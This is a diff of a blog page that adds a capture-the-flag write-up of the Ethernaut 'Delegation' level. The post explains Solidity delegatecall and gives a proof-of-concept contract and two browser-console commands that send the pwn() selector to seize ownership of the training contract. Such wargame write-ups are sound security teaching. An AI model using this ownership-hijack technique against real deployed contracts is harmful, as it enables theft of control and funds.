@@ -21,13 +21,15 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"2997ms.github.io","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","Muse | Mist":320,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
 
-    <meta property="og:type" content="article">
+    <meta name="description" content="It’s been half a year past since the last challenge. Let me start again and complete this series of challenges. The sixth level of Ethernaut is a very interesting challenge that mainly tests our under">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Ethernaut Puzzle 06 Delegation">
 <meta property="og:url" content="http://2997ms.github.io/2023/04/04/Ethernaut/Ethernaut-Puzzle-06-Delegation/index.html">
 <meta property="og:site_name" content="2997ms">
+<meta property="og:description" content="It’s been half a year past since the last challenge. Let me start again and complete this series of challenges. The sixth level of Ethernaut is a very interesting challenge that mainly tests our under">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-04-04T12:19:19.000Z">
-<meta property="article:modified_time" content="2023-04-04T22:16:13.464Z">
+<meta property="article:modified_time" content="2023-05-13T14:52:00.238Z">
 <meta property="article:author" content="2997ms">
 <meta name="twitter:card" content="summary">
 
@@ -127,7 +129,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">149</span>
+          <span class="site-state-item-count">150</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -213,9 +215,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2023-04-04 13:19:19 / Modified: 23:16:13" itemprop="dateCreated datePublished" datetime="2023-04-04T13:19:19+01:00">2023-04-04</time>
+      <time title="Created: 2023-04-04 13:19:19" itemprop="dateCreated datePublished" datetime="2023-04-04T13:19:19+01:00">2023-04-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2023-05-13 15:52:00" itemprop="dateModified" datetime="2023-05-13T15:52:00+01:00">2023-05-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -237,7 +245,30 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        
+        <p>It’s been half a year past since the last challenge. Let me start again and complete this series of challenges.</p>
+<p>The sixth level of Ethernaut is a very interesting challenge that mainly tests our understanding of delegateCall.</p>
+<span id="more"></span>
+
+
+
+<p><code>delegatecall</code> is a low-level function in Solidity that is used to execute code from another contract in the context of the current contract. It is similar to <code>call</code>, but with an important difference: when you use <code>delegatecall</code>, the called contract’s code is executed with the current contract’s context, which means that any storage, balances, or other state variables will be those of the current contract.</p>
+<p>Here’s an example of how <code>delegatecall</code> works:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    uint public x;</span><br><span class="line"></span><br><span class="line">    function setX(uint _x) public &#123;</span><br><span class="line">        x = _x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    uint public x;</span><br><span class="line">    B public b;</span><br><span class="line"></span><br><span class="line">    constructor(address _b) &#123;</span><br><span class="line">        b = B(_b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setX(uint _x) public &#123;</span><br><span class="line">        x = _x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setXFromB(uint _x) public &#123;</span><br><span class="line">        (bool success, ) = address(b).delegatecall(abi.encodeWithSignature(&quot;setX(uint256)&quot;, _x));</span><br><span class="line">        require(success, &quot;delegatecall failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>In this example, <code>A</code> has a reference to a <code>B</code> instance and a <code>setXFromB</code> function that uses <code>delegatecall</code> to call <code>B</code>‘s <code>setX</code> function with the same argument. When <code>setXFromB</code> is called, <code>B</code>‘s code is executed in the context of <code>A</code>, which means that the <code>x</code> variable in <code>A</code> will be set instead of the <code>x</code> variable in <code>B</code>.</p>
+<p>It’s important to note that <code>delegatecall</code> is a powerful tool, but also a dangerous one. If you’re not careful, you can inadvertently change the state of your contract in unexpected ways. Always make sure you understand how it works before using it, and test your code thoroughly to ensure that it behaves as expected.</p>
+<p>This challenge requires us to claim the ownership of the <code>Delegation</code> smart contract.</p>
+<p>To claim the ownership, the method is straightforward, which is to find a way to call the <code>fallback</code> function of <code>Delegation</code>, and pass <code>pwn()</code> as <code>msg.data</code>. This will call the <code>pwn()</code> function inside the Delegate smart contract and assign the ownership.</p>
+<p>At first, my idea was to write a smart contract to claim the ownership. My smart contract looked like this:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.1;</span><br><span class="line"></span><br><span class="line">interface Delegation &#123;</span><br><span class="line">&#125;</span><br><span class="line">contract POC &#123;</span><br><span class="line">    Delegation level6 = Delegation(0xeC926C37acc2E36240c484841A2a9847C708475d);</span><br><span class="line"></span><br><span class="line">    function run() external &#123;</span><br><span class="line"> </span><br><span class="line">       (bool success, ) = address(level6).call(abi.encodeWithSignature(&quot;pwn()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>However, I realized later that this method would result in the ownership being assigned to the address of my smart contract instead of my address.</p>
+<p>So, I needed to initiate the transaction myself and call the <code>fallback</code> function of the <code>Delegation</code> contract, passing <code>pwn()</code> as msg.data.</p>
+<p>Run these two commands in the console of the browser:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var pwn_hacked = web3.utils.keccak256(&quot;pwn()&quot;)</span><br><span class="line">contract.sendTransaction(&#123;data: pwn_hacked&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>That’s done! Sumbit the instance!</p>
+
     </div>
 
     
